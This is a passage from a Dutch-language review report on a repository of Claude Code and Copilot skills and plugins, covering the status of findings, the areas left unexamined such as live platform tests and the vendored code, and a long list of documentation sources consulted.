| Het rsync-gebrek in de cloud-sessie | gecorrigeerd | rsync werd tijdens de analyse geïnstalleerd; een verse sessie mist het nog |
| Remote-WSL: onbekend welke home VS Code scant | deels opgelost (critic-4) | De Windows-host (`cacheHome`); fix voor skills in 1.126 |
| Branch protection niet zichtbaar | deels opgelost (critic-3) | `validate-pr` is required (everyone); de ruleset richt zich op niets; een PR-vereiste is niet verifieerbaar |
| Severity-bijstellingen bij verificatie | info | install-update-2 en -3 (alleen macOS), sync-ci-8 en -9 (in CI beperkte impact), landscape-1 en copilot-cli-8 (er is een fallback), portfolio-gap-gitops (speculatief) |

### 9.2 Niet onderzocht (critic)
- Er is geen live test op Windows, WSL, macOS of in VS Code. `install.ps1` en `update-plugins.ps1` zijn niet door PSScriptAnalyzer gehaald.
- Van ~180 vendored bestanden is de code niet gereviewd (scripts van anthropic-skills, `claude-security/scripts/lib/*.py`, `code-modernization/workflows/*.js`, mattpocock `template.sh`). `validate.py` regex-scant ze alleen.
- De inhoud van `plugins/powershell` (SKILL.md 202 regels + reference 681 regels) is niet beoordeeld. Er zijn geen hooks of allowed-tools, dus het risico is laag.
- Hoe de repo zich gedraagt als workspace voor de Copilot coding agent (`copilot-setup-steps.yml`, firewall) is niet onderzocht.
- De omgang met secrets (kubeconfig, az-tokens, `TFE_TOKEN`) bij de voorgestelde MCP-servers is niet onderzocht.

### 9.3 Gebruikte bronnen (selectie)

*Claude Code:*
- https://code.claude.com/docs/en/hooks
- https://code.claude.com/docs/en/permissions
- https://code.claude.com/docs/en/permission-modes
- https://code.claude.com/docs/en/auto-mode-config
- https://code.claude.com/docs/en/skills
- https://code.claude.com/docs/en/sub-agents
- https://code.claude.com/docs/en/memory
- https://code.claude.com/docs/en/statusline
- https://code.claude.com/docs/en/output-styles
- https://code.claude.com/docs/en/sandboxing
- https://code.claude.com/docs/en/settings-reference
- https://code.claude.com/docs/en/plugins-reference
- https://code.claude.com/docs/en/plugins/loading
- https://code.claude.com/docs/en/plugins/components
- https://code.claude.com/docs/en/plugins/dependencies
- https://code.claude.com/docs/en/plugins/host-marketplace
- https://code.claude.com/docs/en/plugins/cli-reference
- https://code.claude.com/docs/en/mcp
- https://code.claude.com/docs/en/cloud-environments
- https://code.claude.com/docs/en/headless
- https://code.claude.com/docs/en/github-actions
- https://code.claude.com/docs/en/tools-reference
- https://code.claude.com/docs/en/discover-plugins

*VS Code:*
- https://code.visualstudio.com/docs/agent-customization/agent-plugins
- https://code.visualstudio.com/docs/agent-customization/agent-skills
- https://code.visualstudio.com/docs/agent-customization/custom-agents
- https://code.visualstudio.com/docs/agent-customization/custom-instructions
- https://code.visualstudio.com/docs/agents/reference/ai-settings
- https://code.visualstudio.com/docs/agents/reference/hooks-reference
- https://code.visualstudio.com/docs/agents/run/agent-harnesses
- https://code.visualstudio.com/docs/enterprise/ai-settings
- https://code.visualstudio.com/updates/v1_139
- https://github.com/microsoft/vscode/issues/305168

*GitHub (Actions en Copilot):*
- https://docs.github.com/en/actions/concepts/security/github_token
- https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax
- https://docs.github.com/en/copilot/reference/copilot-cli-reference/cli-plugin-reference
- https://docs.github.com/en/copilot/reference/copilot-cli-reference/cli-command-reference
- https://docs.github.com/en/copilot/reference/copilot-cli-reference/cli-config-dir-reference
- https://docs.github.com/en/copilot/concepts/agents/about-plugins
- https://docs.github.com/en/copilot/reference/hooks-reference
- https://docs.github.com/en/get-started/git-basics/configuring-git-to-handle-line-endings
- https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/creating-rulesets-for-a-repository
- https://github.com/github/copilot-cli/issues/4088

*Live GitHub-API:*
- https://api.github.com/repos/lucas4790/my-claude-skills/rulesets/23565151
- https://api.github.com/repos/lucas4790/my-claude-skills/rules/branches/main

*Overig:*
- https://agentskills.io/specification
- https://peps.python.org/pep-0668/
- https://peps.python.org/pep-0604/
- https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/external
- https://developer.hashicorp.com/terraform/cli/commands/output

*Upstream-kandidaten:*
- https://github.com/MicrosoftDocs/mcp
- https://github.com/hashicorp/agent-skills
- https://github.com/docker/skills
- https://github.com/astral-sh/claude-code-plugins
- https://github.com/LukasNiessen/kubernetes-skill
- https://github.com/wshobson/agents
- https://github.com/grafana/skills
- https://github.com/fluxcd/agent-skills
- https://github.com/microsoft/azure-skills
- https://github.com/containers/kubernetes-mcp-server
- https://github.com/github/awesome-copilot
- https://github.com/foxj77/claude-code-skills
- https://github.com/anthropics/claude-plugins-official
